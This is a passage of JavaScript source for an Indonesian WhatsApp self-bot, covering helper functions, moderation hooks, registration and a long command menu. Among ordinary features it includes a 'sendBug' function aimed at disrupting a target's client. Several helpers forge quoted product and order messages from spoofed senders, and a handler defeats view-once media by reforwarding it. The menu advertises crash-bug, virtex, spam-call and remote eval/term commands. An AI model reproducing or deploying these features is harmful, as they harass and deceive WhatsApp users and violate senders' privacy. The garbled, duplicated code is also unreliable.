      var download = function (uri, filename, callback) {
        request.head(uri, function (err, res, body) {
          request(uri)
            .pipe(fs.createWriteStream(filename))
            .on("close", callback);
        });
      };
itsmevall.on('CB:action,,battery', json => {
		global.batteryLevelStr = json[2][0][1].value
	   global.batterylevel = parseInt(batteryLevelStr)
		baterai = batterylevel
        if (json[2][0][1].live == 'true') charging = true
       if (json[2][0][1].live == 'false') charging = false
        console.log(json[2][0][1])
		console.log('Baterai : ' + batterylevel+'%')
	})
	global.batrei = global.batrei ? global.batrei : []
		itsmevall.on('CB:action,,battery', json => {
		const batteryLevelStr = json[2][0][1].value
		const batterylevel = parseInt(batteryLevelStr)
		global.batrei.push(batterylevel)
		}) 
download(url, "./stik" + names + ".png", async function () {
        console.log("selesai");
        let filess = "./stik" + names + ".png";
        let asw = "./stik" + names + ".webp";
        exec(
          `ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`,
          (err) => {
            let media = fs.readFileSync(asw);
            itsmevall.sendMessage(to, media, MessageType.sticker, { quoted: mek });
            fs.unlinkSync(filess);
            fs.unlinkSync(asw);
          }
        );
      });
    };
if (budy.toLowerCase() === `8473`){
		if (isRegister) return 
		    register.push(sender)
		    fs.writeFileSync('./database/user/registered.json', JSON.stringify(register))
		    teks = `Verification success\n\nPlease send *!menu* to view menu`
		    itsmevall.sendMessage(from, teks, text, {quoted: fkontak })
}          /*if (!mek.key.fromMe && banChats === false) return*/
	              
           
const getRegisteredRandomId = () => {
            return _registered[Math.floor(Math.random() * _registered.length)].id
        }
        const addRegisteredUser = (userid, sender, age, time, serials) => {
            const obj = { id: userid, name: sender, age: age, time: time, serial: serials }
            _registered.push(obj)
            fs.writeFileSync('./database/user/registered.json', JSON.stringify(_registered))
        }
        
   
//******************* ใbanchatใ ********************\\
if (isBanchat){
if (!itsMe && !isOwner)return 
}
    const ftokoo = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {}),
      },
      message: {
        productMessage: {
          product: {
            productImage: {
              mimetype: "image/jpeg",
              jpegThumbnail: fs.readFileSync(`./stik/thumb.jpeg`), //Gambarnye
            },
            title: "Katashi/Putra", //Kasih namalu
            description: "SELF BOT",
            currencyCode: "USD",
            priceAmount1000: "2000",
            retailerId: "Katashi",
            productImageCount: 1,
          },
          businessOwnerJid: `0@s.whatsapp.net`,
        },
      },
    };
 const ftok = {
key: {
			fromMe: false,
			participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})
		},
		message: {
			"productMessage": {
				"product": {
					"productImage":{
						"mimetype": "image/jpeg",
						"jpegThumbnail": iye //Gambarnye
					},
					"title": `${ucapanWaktu} ${pushname}`, //Kasih namalu 
					"description": `${ucapanWaktu} ${pushname}`, 
					"currencyCode": "USD",
					"priceAmount1000": "2000",
					"retailerId": `${ucapanWaktu} ${pushname}`,
					"productImageCount": 1
				},
				    "businessOwnerJid": `0@s.whatsapp.net`
		}
	}
}
    const sendMediaURL = async (to, url, text = "", mids = []) => {
      if (mids.length > 0) {
        text = normalizeMention(to, text, mids);
      }
      const fn = Date.now() / 10000;
      const filename = fn.toString();
      let mime = "";
      var download = function (uri, filename, callback) {
        request.head(uri, function (err, res, body) {
          mime = res.headers["content-type"];
          request(uri)
            .pipe(fs.createWriteStream(filename))
            .on("close", callback);
        });
      };
      download(url, filename, async function () {
        console.log("done");
        let media = fs.readFileSync(filename);
        let type = mime.split("/")[0] + "Message";
        if (mime === "image/gif") {
          type = MessageType.video;
          mime = Mimetype.gif;
        }
        if (mime.split("/")[0] === "audio") {
          mime = Mimetype.mp4Audio;
        }
        itsmevall.sendMessage(to, media, type, {
          quoted: mek,
          mimetype: mime,
          caption: text,
          contextInfo: { mentionedJid: mids },
        });

        fs.unlinkSync(filename);
      });
    };
const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
///Button Text

const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
const buttonMessage = {
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 1
}
itsmevall.sendMessage(id, buttonMessage, MessageType.buttonsMessage, options)
}
///Button Image
const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await itsmevall.prepareMessage(from, kma, image)
const buttonMessages = {
imageMessage: mhan.message.imageMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 4
}
itsmevall.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
///Button Video
const sendButVideo = async(id, text1, desc1, vid1, but = [], options = {}) => {
kma = vid1
mhan = await itsmevall.prepareMessage(from, kma, video)
const buttonMessages = {
videoMessage: mhan.message.videoMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 5
}
itsmevall.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
///Button Location
const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await itsmevall.prepareMessage(from, kma, location)
const buttonMessages = {
locationMessage: mhan.message.locationMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 6
}
itsmevall.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
    const kick = function (from, orangnya) {
      for (let i of orangnya) {
        itsmevall.groupRemove(from, [i]);
      }
    };
    const add = function (from, orangnya) {
      itsmevall.groupAdd(from, orangnya);
    };
        const grupinv = (teks) => {
        	grup = itsmevall.prepareMessageFromContent(from, { "groupInviteMessage": { "groupJid": '6288213840883-1616169743@g.us', "inviteCode": 'https://chat.whatsapp.com/Dgt6JhzTvlmEor8Zz23fHx', "groupName": `Argio Dev`, "footerText": "*_ยฉ Dcode Denpa_*", "jpegThumbnail": iye, "caption": teks}}, {quoted:mek})
            itsmevall.relayWAMessage(grup)
        }
const fakeitem = (teks) => {
            itsmevall.sendMessage(from, teks, text, {
                quoted: {
        key:{
        	fromMe:false,
        participant:`0@s.whatsapp.net`, ...(from ? {
remoteJid :"629626029135-1604595598@g.us" }: {})
                    },message:{"orderMessage":{"orderId":"174238614569481","thumbnail":fs.readFileSync(`./stik/thumb.jpeg`),"itemCount":10,"status":"INQUIRY","surface":"CATALOG","message":`Katashi`,"token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="}}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true})}
// Katalog
const reply = (teks) => {
             res = itsmevall.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 111119999, "message": teks, "footerText": "*ItsMevall*", "thumbnail": bgg, "surface": 'CATALOG' }}, {quoted:ftrol})
             itsmevall.relayWAMessage(res)
        }
const fakewa = (teks) => {        
itsmevall.sendMessage(from, teks, text, { thumbnail: fake, sendEphemeral: true, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `${jam} - ${week} ${weton} - ${date}`,body:"",previewType:"PHOTO",thumbnail:iye,sourceUrl:`https://wa.me/6281314050985?text=Assalamualaikum`}}})
		}
const replyfakelink = (teks) => {
itsmevall.sendMessage(from, teks, text,{contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdReply": {
                "title": `Whatsapp-BOT\nP U T R A. (@k4t4sh1._) โขInstagram photos and Videos`,
                "body": "",
                "previewType": "PHOTO",
                "thumbnailUrl": "https://a.top4top.io/p_2073icief0.jpg",
                "thumbnail": fake,
                "sourceUrl": ``
},mentionedJid:[sender]}, quoted : fgif})
};
const replywa = (teks) => {
itsmevall.sendMessage(from, teks, text,{contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdReply": {
                "title": `Whatsapp`,
                "body": `wa.me/629626029135`,
                "mediaType": "10",
                "mediaUrl": `wa.me/629626029135`,
                "thumbnailUrl": "https://j.top4top.io/p_20682m4yj0.jpg",
                "thumbnail": iye,
                "sourceUrl": `wa.me/629626029135`,
},mentionedJid:[sender]}, quoted : mek})
};
const fakeyt = (teks) => {
itsmevall.sendMessage(from, teks, text,{contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdReply": {
"title": `hallo ${pushname}` ,
"body": `${ucapanWaktu}`,
"mediaType": "2",
"thumbnailUrl": "https://c.top4top.io/p_2087f30hj1.jpeg",
"mediaUrl": "https://youtube.com/channel/UCrEMv0c1cuploq5GruMuwvw",
"thumbnail": fs.readFileSync('./stik/thumb.jpeg'),
"sourceUrl": "",
},mentionedJid:[sender]}, quoted : fgif})
};
// Support Di Versi 3.5.2 
    const sendBug = async (target, teks) => {
      if (!teks) teks = ".";
      await itsmevall.relayWAMessage(
        itsmevall.prepareMessageFromContent(
          target,
          itsmevall.prepareDisappearingMessageSettingContent(0),
          {}
        ),
        { waitForAck: true }
      );
      itsmevall.sendMessage(target, teks, "conversation");
    };

    //FUNCTION
    function clockString(ms) {
      let h = isNaN(ms) ? "--" : Math.floor(ms / 3600000);
      let m = isNaN(ms) ? "--" : Math.floor(ms / 60000) % 60;
      let s = isNaN(ms) ? "--" : Math.floor(ms / 1000) % 60;
      return [h, m, s].map((v) => v.toString().padStart(2, 0)).join(":");
    }

    cekafk(afk);
    if (!mek.key.remoteJid.endsWith("@g.us") && offline) {
      if (!mek.key.fromMe) {
        if (isAfk(mek.key.remoteJid)) return;
        addafk(mek.key.remoteJid);
        heheh = ms(Date.now() - waktu);
        itsmevall.sendMessage(
          mek.key.remoteJid,
          `@${owner} Sedang Offline!\n\n*Alasan :* ${alasan}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`,
          MessageType.text,
          {
            contextInfo: {
              mentionedJid: [`${owner}@s.whatsapp.net`],
              stanzaId: "B826873620DD5947E683E3ABE663F263",
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                imageMessage: {
                  caption: "*OFFLINE*",
                  jpegThumbnail: fs.readFileSync("./stik/thumb.jpeg"),
                },
              },
            },
          }
        );
      }
    }
    if (mek.key.remoteJid.endsWith("@g.us") && offline) {
      if (!mek.key.fromMe) {
        if (mek.message.extendedTextMessage != undefined) {
          if (mek.message.extendedTextMessage.contextInfo != undefined) {
            if (
              mek.message.extendedTextMessage.contextInfo.mentionedJid !=
              undefined
            ) {
              for (let ment of mek.message.extendedTextMessage.contextInfo
                .mentionedJid) {
                if (ment === `${owner}@s.whatsapp.net`) {
                  if (isAfk(mek.key.remoteJid)) return;
                  addafk(mek.key.remoteJid);
                  heheh = ms(Date.now() - waktu);
                  itsmevall.sendMessage(
                    mek.key.remoteJid,
                    `@${owner} Sedang Offline!\n\n *Alasan :* ${alasan}\n *Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`,
                    MessageType.text,
                    {
                      contextInfo: {
                        mentionedJid: [`${owner}@s.whatsapp.net`],
                        stanzaId: "B826873620DD5947E683E3ABE663F263",
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                        quotedMessage: {
                          imageMessage: {
                            caption: "*OFFLINE*",
                            jpegThumbnail: fs.readFileSync("./stik/thumb.jpeg"),
                          },
                        },
                      },
                    }
                  );
                }
              }
            }
          }
        }
      }
    }

    //========================================================================================================================//
    colors = ["red", "white", "black", "blue", "yellow", "green"];
    const isMedia = type === "imageMessage" || type === "videoMessage";
    const isQuotedImage =
      type === "extendedTextMessage" && content.includes("imageMessage");
    const isQuotedVideo =
      type === "extendedTextMessage" && content.includes("videoMessage");
    const isQuotedAudio =
      type === "extendedTextMessage" && content.includes("audioMessage");
    const isQuotedSticker =
      type === "extendedTextMessage" && content.includes("stickerMessage");

/*if (listbut) console.log("[",color("command","lime"),"]",time2,color(listbut,"lime"),"from",color(sender.split("@")[0],"cyan"))*/
//list command

async function sendFileFromUrl(from, url, caption, msg, men) {
            let mime = '';
            let res = await axios.head(url)
            mime = res.headers['content-type']
            let type = mime.split("/")[0]+"Message"
            if(mime === "image/gif"){
                type = MessageType.video
                mime = Mimetype.gif
            }
            if(mime === "application/pdf"){
                type = MessageType.document
                mime = Mimetype.pdf
            }
            if(mime.split("/")[0] === "audio"){
                mime = Mimetype.mp4Audio
            }
            return itsmevall.sendMessage(from, await getBuffer(url), type, {caption: caption, quoted: mek, mimetype: mime, contextInfo: {"mentionedJid": men ? men : []}})
        }
    if (!isGroup && prefix && command)
      console.log(
        "\x1b[1;31m~\x1b[1;37m>",
        "[\x1b[1;32mEXEC\x1b[1;37m]",
        time,
        color(command),
        "from",
        color(sender.split("@")[0]),
        "args :",
        color(args.length)
      );
    //if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
    if (prefix && command && isGroup)
      console.log(
        "\x1b[1;31m~\x1b[1;37m>",
        "[\x1b[1;32mEXEC\x1b[1;37m]",
        time,
        color(command),
        "from",
        color(sender.split("@")[0]),
        "in",
        color(groupName),
        "args :",
        color(args.length)
      );
    //if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
    if (isGroup && !isVote) {
      if (budy.toLowerCase() === "vote") {
        let vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`));
        let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`));
        let fil = vote.map((v) => v.participant);
        let id_vote = sender ? sender : "629626029135@s.whatsapp.net";
        if (fil.includes(id_vote)) {
          return mentions(
            "@" + sender.split("@")[0] + " Anda sudah vote",
            fil,
            true
          );
        } else {
          vote.push({
            participant: id_vote,
            voting: "โ",
          });
          fs.writeFileSync(`./lib/${from}.json`, JSON.stringify(vote));
          let _p = [];
          let _vote =
            "*Vote* " +
            "@" +
            _votes[0].votes.split("@")[0] +
            `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n`;
          for (let i = 0; i < vote.length; i++) {
            _vote += `@${vote[i].participant.split("@")[0]}\n*Vote* : ${
              vote[i].voting
            }\n\n`;
            _p.push(vote[i].participant);
          }
          _p.push(_votes[0].votes);
          mentions(_vote, _p, true);
        }
      } else if (budy.toLowerCase() === "devote") {
        const vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`));
        let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`));
        let fil = vote.map((v) => v.participant);
        let id_vote = sender ? sender : "629626029135@s.whatsapp.net";
        if (fil.includes(id_vote)) {
          return mentions(
            "@" + sender.split("@")[0] + " Anda sudah vote",
            fil,
            true
          );
        } else {
          vote.push({
            participant: id_vote,
            voting: "โ",
          });
          fs.writeFileSync(`./lib/${from}.json`, JSON.stringify(vote));
          let _p = [];
          let _vote =
            "*Vote* " +
            "@" +
            _votes[0].votes.split("@")[0] +
            `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n`;
          for (let i = 0; i < vote.length; i++) {
            _vote += `@${vote[i].participant.split("@")[0]}\n*Vote* : ${
              vote[i].voting
            }\n\n`;
            _p.push(vote[i].participant);
          }
          _p.push(_votes[0].votes);
          mentions(_vote, _p, true);
        }
      }
    }
    const sendKontak = (from, nomor, nama, org = "") => {
      const vcard =
        "BEGIN:VCARD\n" +
        "VERSION:3.0\n" +
        "FN:" +
        nama +
        "\n" +
        "ORG:" +
        org +
        "\n" +
        "TEL;type=CELL;type=VOICE;waid=" +
        nomor +
        ":+" +
        nomor +
        "\n" +
        "END:VCARD";
      itsmevall.sendMessage(
        from,
        { displayname: nama, vcard: vcard },
        MessageType.contact,
        { quoted: mek }
      );
    };
    //kasih wm gw ajg kalau make
    if (isGroup && isAntilink && !mek.key.fromMe) {
      if (budy.includes("://chat.whatsapp.com/")) {
        if (isGroupAdmins) return reply("admin bebas");
        reply("ANTILINK DETECTED!! MAAF ANDA AKAN DIKICK ;V");
        itsmevall.groupRemove(from, [sender]);
      }
    }
    if (isGroup && isAntiviewonce && m.mtype == "viewOnceMessage") {
      reply(
        `@${sender.split("@")[0]} Terdeteksi mengirim gambar/video viewonce!`
      );
      var msg = { ...mek };
      msg.mek = mek.message.viewOnceMessage.message;
      msg.mek[Object.keys(msg.mek)[0]].viewOnce = false;
      itsmevall.copyNForward(m.chat, msg);
    }
    if (
      isGroup &&
      isAntihidetag &&
      m.message[m.mtype]?.contextInfo?.mentionedJid?.length ==
        groupMembers.length
    ) {
      console.log(
        color("[ANTI-HIDETAG]", "red"),
        color(`@${sender.split("@")[0]} mengirim pesan hidetag`, "white")
      );
      reply(`@${sender.split("@")[0]} Terdeteksi mengirim pesan hidetag!!`);
      kick(from, sender);
    }

    if (isGroup && isAntivirtex && !mek.key.fromMe) {
      if (budy.length > 700) {
        if (isGroupAdmins) return reply("admin bebas");
        reply("ANTIVIRTEX DETECTED!! MAAF ANDA AKAN DIKICK ;V");
        itsmevall.groupRemove(from, sender);
      }
    }
    if (isGroup && autojoin == true) {
      if (budy.includes("://chat.whatsapp.com/")) {
        console.log(
          color("[AUTO-JOIN]", "red"),
          color("YAHAHAHHAHAH", "white")
        );
        itsmevall.query({
          json: [
            "action",
            "invite",
            `${budy.replace("https://chat.whatsapp.com/", "")}`,
          ],
        });
      }
    }
    if (isGroup && isKickarea && !mek.key.fromMe) {
      if (sender.includes("62")) {
        reply("GRUP ONLY +62!");
        itsmevall.groupRemove(from, [sender]);
      }
    }
    // Runtime Di Bio Bang๐น\\
    let settingstatus = 0;
    if (new Date() * 1 - settingstatus > 1000) {
      let _uptime = process.uptime() * 1000;
      let uptime = clockString(_uptime);

await itsmevall.setStatus(`Mode Bot Aktif Selama ${uptime}`).catch((_) => _);
      settingstatus = new Date() * 1;
    }
    if (!mek.key.fromMe && banChats === true) return;
switch (command) {
case 'verify':
case 'Verify':
              
if (isRegistered) return reply('Akun kamu sudah terverfikasi')
const serialUser = createSerial(18)
	         try {
								ppimg = await itsmevall.getProfilePicture(`${sender.split('@')[0]}@c.us`)
								} catch {
								ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
							}
	        veri = sender
	        _registered.push(sender)
	        fs.writeFileSync('./database/user/registered.json', JSON.stringify(_registered))
	        addRegisteredUser(sender, serialUser)
	         const anuu = `ใ *๐ฃ๐๐ก๐๐๐๐ง๐๐ฅ๐๐ก ๐จ๐ฆ๐๐ฅ* ใ
*Terimakasih Sudah Mendaftarkan Diri Dalam Database Bot WhatsApp*

*โ๏ธ Nama :* ${pushname}
*โ๏ธ API :* +${sender.split('@')[0]}
*โ๏ธ Serial:* ${serialUser}
*โ ๏ธTotal:* ${_registered.length} ๐ฃ๐ฒ๐ป๐ด๐ด๐๐ป๐ฎ

*ใ ๐๐ณ๐ฆ๐ข๐ต๐ฆ๐ฅ ๐๐บ Katashi ใท๏ธ ใ*`
         haitod = await getBuffer(`http://hadi-api.herokuapp.com/api/card/verify?nama=${encodeURI(pushname)}&member=${_registered.length}&seri=${serialUser}&pp=${ppimg}&bg=${ppimg}`)
             buttons = [{buttonId: `${prefix}menu`,buttonText:{displayText: `</๏ธMENU`},type:1}]
              imageMsg = (await itsmevall.prepareMessageMedia(haitod, "imageMessage", { thumbnail: haitod, })).imageMessage
              buttonsMessage = {footerText:'๐๐ณ๐ฆ๐ข๐ต๐ฆ๐ฅ ๐๐บ Katashiใท๏ธ', imageMessage: imageMsg,
              contentText:`${anuu}`,buttons,headerType:4}
              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{quoted: fkontak})
              itsmevall.relayWAMessage(prep)
	         console.log(color('[REGISTER]'), color(time, 'yellow'), 'Serial:', color(serialUser, 'cyan'), 'in', color(sender || groupName))
	    // console.log(e)
            setTimeout( () => {
			itsmevall.updatePresence(from, Presence.composing)
			reply(`*Terimakasih Telah Terdaftar Di Katashi Bot*`)
		}, 2000)
        break
      
case 'help2':
case 'menu2':
groups = itsmevall.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = itsmevall.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await itsmevall.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
       txtt =`Hai ${pushname}\n ${ucapanWaktu} Kak ๐`

               buttons = [{buttonId:`${prefix}hana`, 
               buttonText:{displayText: 'Klik Dongใท๏ธ'},type:1},
               {buttonId:`${prefix}owner`,buttonText:{displayText:'Creatorใท๏ธ'},type:1},
               {buttonId:`${prefix}command`,buttonText:{displayText:'V2ใท๏ธ'},type:1}]


               imageMsg = (await itsmevall.prepareMessageMedia(fs.readFileSync(`./stik/oksip.jpeg`), 'imageMessage', {thumbnail: fs.readFileSync(`./stik/oksip.jpeg`)})).imageMessage

               buttonsMessage = {
               contentText: `${txtt}`,
               footerText: `ใท๏ธ ๐๐ฉ๐๐ฉ๐ช๐จ ใท๏ธ
               
 ๐๐ซ๐จ๐ฎ๐ฉ ๐๐ก๐๐ญ๐ฌ : ${groups.length} 
 ๐๐ซ๐ข๐ฏ๐๐ญ๐ ๐๐ก๐๐ญ๐ฌ : ${privat.length}
 ๐๐จ๐ญ๐๐ฅ ๐๐ก๐๐ญ๐ฌ : ${totalChat.length}
 ๐๐ฉ๐๐๐ : ${latensie.toFixed(4)} _Second_
 ๐๐๐ญ๐ข๐ฏ๐ : ${runtime(process.uptime())}
 ๐๐ฅ๐๐ญ๐๐จ๐ซ๐ฆ : ${os.platform()}`, imageMessage: imageMsg,
               buttons: buttons,
               headerType: 4
}
prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{quoted: fkontak})
               itsmevall.relayWAMessage(prep)
             
               break

        case 'hana':
        case 'menu':
        case 'Hana':
        case 'Menu':
groups = itsmevall.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = itsmevall.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await itsmevall.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "6289626029135@s.whatsapp.net"
        dtod = '6289626029135'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await itsmevall.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://api.telnyx.com/anonymous/v2/number_lookup/${senderNumber}`, {method: 'get'})
       menu = `
โ ๐๐ฎ๐ถ ๐๐ฎ๐ธ @${sender.split("@")[0]}

โฉ ๐๐๐ : ${jam}
โฉ ๐๐๐๐ : ${week} ${weton}
โฉ ๐๐ข๐ฏ๐จ๐จ๐ข๐ญ : ${date} 

โฉ  INDONESIA TIME
โฉ  Wib : ${timeWib}
โฉ  Wita : ${timeWita}
โฉ  Wit : ${timeWit}  

ใท๏ธ ๐๐ซ๐จ๐ฎ๐ฉ ๐๐ก๐๐ญ๐ฌ : ${groups.length} 
ใท๏ธ ๐๐ซ๐ข๐ฏ๐๐ญ๐ ๐๐ก๐๐ญ๐ฌ : ${privat.length}
ใท๏ธ ๐๐จ๐ญ๐๐ฅ ๐๐ก๐๐ญ๐ฌ : ${totalChat.length}
ใท๏ธ ๐๐๐๐ : ${latensie.toFixed(4)} _Second_
ใท๏ธ ๐๐๐ญ๐ข๐ฏ๐ : ${runtime(process.uptime())}
ใท๏ธ ๐๐ฅ๐๐ญ๐๐จ๐ซ๐ฆ : ${os.platform()}
${readmore}

 โฌฃ *๐๐๐๐๐ ๐๐๐๐๐* ใท๏ธ
> โฌก ${prefix}off
> โฌก ${prefix}isbaileys
> โฌก ${prefix}banchat
> โฌก ${prefix}unbanchat
> โฌก ${prefix}listbc
> โฌก ${prefix}setcmd
> โฌก ${prefix}delcmd
> โฌก ${prefix}listcmd
> โฌก ${prefix}restart
> โฌก ${prefix}antidelete on|off
> โฌก ${prefix}autoketik on|off
> โฌก ${prefix}autoread gc in / gc off
> โฌก ${prefix}autovn on|off
> โฌก ${prefix}anticall on|off
> โฌก ${prefix}getcaption
> โฌก ${prefix}bugkatalog
> โฌก ${prefix}buggc id grup
> โฌก ${prefix}okvirtex
> โฌก ${prefix}on
> โฌก ${prefix}status
> โฌก ${prefix}setthumb
> โฌก ${prefix}settarget
> โฌก ${prefix}setfakeimg
> โฌก ${prefix}setreply
> โฌก ${prefix}hacked nama
> โฌก ${prefix}setprefix
> โฌก ${prefix}mode /public-self/
> โฌก ${prefix}term <code>
> โฌก ${prefix}eval <code>
> โฌก ${prefix}colongsw reply
> โฌก ${prefix}spamcall (nomor)
 

 โฌฃ *๐๐๐๐๐ ๐๐๐๐* ใท๏ธ
> โฌก ${prefix}grup 
> โฌก ${prefix}promote 
> โฌก ${prefix}demote 
> โฌก ${prefix}setdesc
> โฌก ${prefix}setname
> โฌก ${prefix}nsfw 1/0
> โฌก ${prefix}kick 
> โฌก ${prefix}add 
> โฌก ${prefix}getbio
> โฌก ${prefix}getname 
> โฌก ${prefix}reminder 
> โฌก ${prefix}listonline
> โฌก ${prefix}sider reply
> โฌก ${prefix}antilink on|off
> โฌก ${prefix}tod
> โฌก ${prefix}tospam jumlah
> โฌก ${prefix}antihidetag on|off
> โฌก ${prefix}antiviewonce on|off
> โฌก ${prefix}antivirtex on|off
> โฌก ${prefix}autojoin on|off
> โฌก ${prefix}kickarea
> โฌก ${prefix}opentime <waktunya>
> โฌก ${prefix}closetime <waktunya>
> โฌก ${prefix}opentime <waktunya>
> โฌก ${prefix}groupinfo <waktunya> 
 

 โฌฃ *๐๐๐๐๐ ๐๐ผ๐๐๐* ใท๏ธ
> โฌก ${prefix}sticker
> โฌก ${prefix}swm author|packname
> โฌก ${prefix}take author|packname
> โฌก ${prefix}fdeface
> โฌก ${prefix}attp teks
> โฌก ${prefix}fancytext teks
> โฌก ${prefix}emoji 
> โฌก ${prefix}halloween teks
> โฌก ${prefix}vampire teks
> โฌก ${prefix}codetxt teks
> โฌก ${prefix}matrix teks
> โฌก ${prefix}googletxt
> โฌก ${prefix}spiderman teks
> โฌก ${prefix}express teks
> โฌก ${prefix}maker2d2 teks
> โฌก ${prefix}maker2d3 teks
> โฌก ${prefix}maker2d4 teks
> โฌก ${prefix}golden teks
> โฌก ${prefix}flower teks
> โฌก ${prefix}dance
> โฌก ${prefix}wooden teks
> โฌก ${prefix}burn
> โฌก ${prefix}glow teks
> โฌก ${prefix}summer teks
> โฌก ${prefix}neon teks
> โฌก ${prefix}coffeecup teks
> โฌก ${prefix}coffeecup2 teks
> โฌก ${prefix}battlefield teks|teks
> โฌก ${prefix}googletxt2 teks
> โฌก ${prefix}transformer teks
> โฌก ${prefix}nulis teks
> โฌก ${prefix}text3d teks
> โฌก ${prefix}warrior teks
> โฌก ${prefix}bplogo <text>
> โฌก ${prefix}splaylogo <text>
> โฌก ${prefix}phlogo <text>
> โฌก ${prefix}gplaylogo <text>
 

 โฌฃ *๐๐๐๐๐ ๐พ๐๐๐๐๐๐* ใท๏ธ
> โฌก ${prefix}tomp3
> โฌก ${prefix}tomp4
> โฌก ${prefix}toimg
> โฌก ${prefix}slow
> โฌก ${prefix}fast
> โฌก ${prefix}reverse
> โฌก ${prefix}tourl
 

 โฌฃ *๐๐๐๐๐ ๐ฟ๐๐๐๐๐๐ผ๐ฟ๐๐* ใท๏ธ
> โฌก ${prefix}play query
> โฌก ${prefix}ytmp4 link
> โฌก ${prefix}ytmp3 link
> โฌก ${prefix}video query
> โฌก ${prefix}instagram link
> โฌก ${prefix}twitter
> โฌก ${prefix}facebook link
> โฌก ${prefix}tiktokdl
> โฌก ${prefix}zippyshare [ link ]
> โฌก ${prefix}jooxplay [ query ]
> โฌก ${prefix}wattpad [ link ]
> โฌก ${prefix}zippyshare [ link ]
> โฌก ${prefix}spotify [ link ]
> โฌก ${prefix}spotifysearch [ link ]
> โฌก ${prefix}shopee [ query ]
> โฌก ${prefix}cerpen 
> โฌก ${prefix}ceritahoror
> โฌก ${prefix}mediafire
> โฌก ${prefix}wp2
> โฌก ${prefix}otakudesu
> โฌก ${prefix}kusuonime
> โฌก ${prefix}test
> โฌก ${prefix}tribunnews*
> โฌก ${prefix}liputan*
> โฌก ${prefix}foxnews*
> โฌก ${prefix}soundcloud* [url]
> โฌก ${prefix}urlshort <link>
> โฌก ${prefix}urlshort2 <link>
> โฌก ${prefix}ppcp 
> โฌก ${prefix}bts
> โฌก ${prefix}blackpink
 

 โฌฃ *๐๐๐๐๐ ๐๐ผ๐* ใท๏ธ
> โฌก ${prefix}hidetag
> โฌก ${prefix}kontag
> โฌก ${prefix}sticktag
> โฌก ${prefix}totag
 
   โฌฃ *๐๐๐๐๐ ISLAM* ใท๏ธ
> โฌก ${prefix}jadwalsholat (daerah)
